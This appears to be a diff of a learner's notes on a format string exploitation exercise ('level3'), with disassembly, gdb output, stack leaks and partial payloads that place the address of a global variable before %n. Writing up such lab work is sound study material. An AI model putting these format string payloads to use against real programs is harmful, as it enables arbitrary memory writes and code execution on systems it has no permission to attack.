@@ -1,135 +1,57 @@
 https://cs155.stanford.edu/papers/formatstring-1.2.pdf
 
+==========================================================================================
 
-======================================================
+commande:
+    objdump -D level3 | grep "<m>"
 
-currently ongoing:
-	- Trying to write in m addr via printf
+result:
+    0804988c <m>:
 
+==========================================================================================
+commande: 
+    disas v
 
-got a SIGSEGV by trying write an address with some padding:
-	(gdb) r
-	The program being debugged has been started already.
-	Start it from the beginning? (y or n) y
-	Starting program: /home/user/level3/level3
-	\x8c\x98\x04\x08_%08x.%08x.%08x.%08x.%08x.%n -> this line made crash
+result:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x218,%esp
+   0x080484ad <+9>:	mov    0x8049860,%eax
+   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
+   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)				|--> mov 0x200 into $esp+0x4
+   0x080484be <+26>:	lea    -0x208(%ebp),%eax
+   0x080484c4 <+32>:	mov    %eax,(%esp)
+   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:	lea    -0x208(%ebp),%eax 			|--> Mon buffer commmence ici | load the addr at $ebp-0x208 in $eax
+   0x080484d2 <+46>:	mov    %eax,(%esp)					|--> put the value of the addr in $eax into %esp
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>		|--> print the buffer
+   0x080484da <+54>:	mov    0x804988c,%eax				|--> put the value in 0x804988c into $eax
+=> 0x080484df <+59>:	cmp    $0x40,%eax					|--> compare the value in $eax to 0x40
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+   0x080484e4 <+64>:	mov    0x8049880,%eax
+   0x080484e9 <+69>:	mov    %eax,%edx
+   0x080484eb <+71>:	mov    $0x8048600,%eax
+   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
+   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
+   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
+   0x08048504 <+96>:	mov    %eax,(%esp)
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:	movl   $0x804860d,(%esp)
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>
+   0x08048518 <+116>:	leave
+   0x08048519 <+117>:	ret
 
-	Program received signal SIGSEGV, Segmentation fault.
-	0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+   %p et %n prennent des nombres afin de decrire ce qu'il affiche / ecrit
+   %4$p -> affiche la position 4 du buffer
 
+==========================================================================================
 
-it shows that it crash specifically at the line of the compare:
+Se referer au script.py python creer. Il permet de creer un payload de %p avec leur index afin de trouver le debut du buffer
+le buffer commence a index 4
 
-	(gdb) backtrace
-	#0  0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
-	#1  0xb7e7887f in printf () from /lib/i386-linux-gnu/libc.so.6
-	#2  0x080484da in v ()
-	#3  0x08048525 in main ()
-	(gdb) disas v
-	0x080484da <+54>:    mov    0x804988c,%eax
-   	0x080484df <+59>:    cmp    $0x40,%eax
+commande:
+    python /tmp/payload.py | ./level3
 
-https://youtu.be/ykMdLCURWFk?is=dr-_eGOBqMqU5wSd -> format string attack
-https://aeb.win.tue.nl/linux/hh/stack-layout.html -> stack explanations
-
-objdump -t level3 -> get all symbols ( allowed me to see that m was global (g) and its addr )
-m is related to the section .bss
-
-addr 	 	flag bit	value	section		alignment or size		name
-0804988c	g     		O		.bss		00000004              	m
-
-Discover that putting x number of char before %n is writing that number as an int in memory
-
-0 -> 67
-%n -> 68
-"0000000000000000000000000000000000000000000000000000000000000000000%n\n", &m
-
-Program received signal SIGSEGV, Segmentation fault.
-0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) info registers
-eax            0x200	512
-ecx            0xbffff514	-1073744620
-edx            0xb7e707ea	-1209595926
-ebx            0xb7fd0ff4	-1208152076
-esp            0xbfffef40	0xbfffef40
-ebp            0xbffff4e8	0xbffff4e8
-esi            0xb7fd1a20	-1208149472
-edi            0x44	68							----> Here the 68 correspond to my 0 str
-eip            0xb7e7312c	0xb7e7312c <vfprintf+19020>
-eflags         0x210286	[ PF SF IF RF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-
-
-0 -> 63
-%n -> 64
-"000000000000000000000000000000000000000000000000000000000000000%n\n", &m
-
-Program received signal SIGSEGV, Segmentation fault.
-0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) info register
-eax            0x200	512
-ecx            0xbffff514	-1073744620
-edx            0xb7e707ea	-1209595926
-ebx            0xb7fd0ff4	-1208152076
-esp            0xbfffef40	0xbfffef40
-ebp            0xbffff4e8	0xbffff4e8
-esi            0xb7fd1a20	-1208149472
-edi            0x40	64                          ----> Here the 64 correspon to my 0 str
-eip            0xb7e7312c	0xb7e7312c <vfprintf+19020>
-eflags         0x210286	[ PF SF IF RF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-
-Now we need to understand how to write that number into m
-
-
-python -c 'print "%x "*512' > /tmp/payload // replace %x by %p just give the same result with 0x prefix
-
-(gdb) r < /tmp/payload
-Starting program: /home/user/level3/level3 < /tmp/payload
-200 b7fd1ac0 b7ff37d0 <-- potential real values
-
-junk it's egal to %x --> 
-25207825 78252078 20782520 25207825 78252078 20782520 
-25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 
-20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
-78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
-25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 
-20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
-78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
-25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 
-20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
-78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
-25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 
-20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
-78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
-25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 
-20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
-78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
-25207825 252078 
-<-- junk it's egal to %x in fact
-
--- > potential real values --> 
-b7fed280 0 bffff738 8048525 8048530 0 0 
-b7e454d3 1 bffff7d4 bffff7dc b7fdc858 0 
-bffff71c bffff7dc 0 8048258 b7fd0ff4 0 
-0 0 663f5091 5178f481 0 0 0 1 80483f0 0 
-b7ff26b0 b7e453e9 b7ffeff4 1 80483f0 0 
-8048411 804851a 1 bffff7d4 
-[Inferior 1 (process 2650) exited normally]
-
-Should be possible out of those addr to calculate "padding" to find m
-
-python -c 'print "AAAAAAAAAAAAAAAAAAAAAA" + "\x8c\x98\x04\x08" + "bbbbbbbbb"  + "%x "*512' | ./level3
-988c4141 --> this value appears in the middle of the A and ear
-
+result:
+    AAAA|1=0x200|2=0xb7fd1ac0|3=0xb7ff37d0|4=0x41414141|5=0x253d317c|6=0x7c702431|7=0x32253d32|8=0x337c7024|9=0x2433253d|10=0x3d347c70|11=0x70243425|12=0x253d357c|13=0x7c702435|14=0x36253d36|15=0x377c7024
 
